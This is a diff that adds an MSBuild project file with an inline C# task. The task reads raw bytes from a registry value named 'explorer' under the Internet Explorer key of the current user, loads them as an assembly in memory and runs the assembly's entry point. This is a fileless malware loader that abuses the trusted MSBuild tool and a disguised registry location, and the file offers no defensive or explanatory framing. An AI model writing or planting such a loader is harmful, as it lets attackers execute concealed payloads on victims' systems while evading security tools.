@@ -1,0 +1,29 @@
+<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <UsingTask TaskName="RunAssemblyFromRegistry"
+             TaskFactory="CodeTaskFactory"
+             AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.Core.dll">
+    <Task>
+      <Code Type="Class" Language="cs"><![CDATA[
+using System;
+using System.Reflection;
+using Microsoft.Win32;
+
+public class RunAssemblyFromRegistry : Microsoft.Build.Utilities.Task
+{
+    public override bool Execute()
+    {
+        var key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Internet Explorer");
+        var rawBytes = (byte[])key.GetValue("explorer");
+        var asm = Assembly.Load(rawBytes);
+        asm.EntryPoint.Invoke(null, null);
+        return true;
+    }
+}
+      ]]></Code>
+    </Task>
+  </UsingTask>
+
+  <Target Name="run">
+    <RunAssemblyFromRegistry />
+  </Target>
+</Project>
